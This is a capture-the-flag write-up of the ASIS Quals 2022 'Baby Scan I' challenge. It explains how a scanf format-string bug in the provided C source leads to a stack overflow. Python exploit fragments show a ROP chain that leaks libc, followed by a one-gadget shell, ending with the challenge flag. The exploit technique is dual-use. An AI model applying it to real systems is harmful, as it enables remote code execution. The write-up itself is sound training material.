---
title: 'Baby Scan I - ASIS QUALS 2022'
permalink: /writeups/asisquals2022/babyscanI
---

## Baby Scan I

> Is it possible to scan the thousands of resulting strings by hand? We think it’s tedious, but will get the job done!

## Intro

At the start of my master's degree, I joined STT for the ASIS Quals CTF 2022 and one of the pwn challenges was baby scan. It is, as you'll see, a format string challenge, but this time the vulnerable function will be scanf, and not printf as usuall. I managed to solve this challenge with the help of one of my teamates.

## Analysis

### checksec

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### file command output

```bash
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=b31cf6b807484f2d04a80ceb67725cdb0f0785cd, not stripped
```

### Code

Source code was provided so reverse will be done quickly

```c
int main() {
  char size[16], fmt[8], *buf;

  printf("size: ");
  scanf("%15s", size);
  if (!isdigit(*size)) {
    puts("[-] Invalid number");
    return 1;
  }

  buf = (char*)alloca(atoi(size) + 1);

  printf("data: ");
  snprintf(fmt, sizeof(fmt), "%%%ss", size);
  scanf(fmt, buf);

  return 0;
}
```

It's pretty obvious just by looking at the code that we control the format string in scanf. However, we need to pass a size that passes the isDigit check. The key is that isDigit expects an int, but a char* is passed, so it will only check the first character sent. Ensuring that the first character is a decimal digit then the rest is easy, since we control the format string in scanf. It is worth mentioning that, the %% will result in a % being printed into the string. Therefore, what will be printed into the fmt string is %sizes, where we control the size.

## Exploit

### Libc leak

By sending 8s%s this will result in the following format string %8s%ss. Basically scanf will read a string of 8 characters, then read another of arbitrary size (until a space or a new line) and then fail (since the s there won't match anything). However, looking at the scanf arguments we see that we only specified one argument, buf. Thus, we have an out of bounds write, aka buffer overflow in the stack. Using this overflow we will then get RCE.  
Having figgured out the vulnerability, this is a simple rop to call puts(puts) (puts with its address as argument) to leak libc base address) and have another run at main. This part of the exploit is shown bellow. Simple note, one could have used any number besides 8 as long as it is a decimal digit. However, keep in mind that changing the 8 to a different value will affect the padding sent, since part of the padding is beiing extract by the %8s format.

```python
io.sendlineafter(b"size: ", b'8s%s')

io.sendlineafter(b"data: ", b"A" * 96 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))
```

It is worth mentioning that the gadget to set the rdi register used was

```bash
0x0000000000401433 : pop rdi ; ret
```

Then all there is to do is parse the leak and compute libc base address

### Shell

Using the same payload as last time, only this time overwriting the main's return address to the one gadget address gives us a shell. The one gadget that was chosen is listed bellow.

```bash
0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL
```

As you can see, I got a shell and the flag

```bash
[+] Opening connection to 65.21.255.31 on port 13370: Done
[*] Switching to interactive mode
ASIS{06e5ff13b438f5d6626a97758fddde3e502fe3fc}
```

Remember that this is one of many possible solutions
